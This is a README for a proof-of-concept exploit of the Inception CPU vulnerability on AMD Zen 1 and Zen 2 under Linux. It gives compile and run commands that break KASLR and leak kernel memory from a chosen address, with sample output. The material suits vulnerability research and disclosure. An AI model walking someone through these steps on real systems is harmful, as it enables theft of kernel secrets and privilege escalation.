This folder contains the PoC exploit of Inception for AMD Zen 1, Zen 1+ and Zen 2, all running Linux kernel 5.19.0-28-generic.

1. Compile inception.c. Pass two cores on the same physical core. Define any of ('ZEN', 'ZEN2'). For example:

clang -DZEN2 -DCORE1=1 -DCORE2=9 inception.c -o inception

2. Also compile a workload for the sibling hyperthread:

clang -DSET=33 workload.c -o workload

Changing SET (0 - 1023) can sometimes improve the performance of the exploit. 

3. Lastly, run ./inception, and pass a kernel address from which you want to leak:

./inception <INSERT KERNEL ADDRESS>

The results are printed to stdout and are also stored in data.bin.
Before running, make sure transparent hugepages are enabled, since we rely on this feature for
more robust eviction sets (not a strict requirement of Inception).

Optional: The kmod in ./kmod can be installed to get an example kernel address from which we can leak:

cd ../kmod; make install; dmesg | tail -n 10; cd ../zen_1_2

When leaking from the provided kmod, the output of Inception should look something like this:

.........
Text: 0xffffffffaa000000
.................................
Phys: 0x172c00000
.....................
Physmap: 0xffff925700000000
Took 5 seconds to break KASLR
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
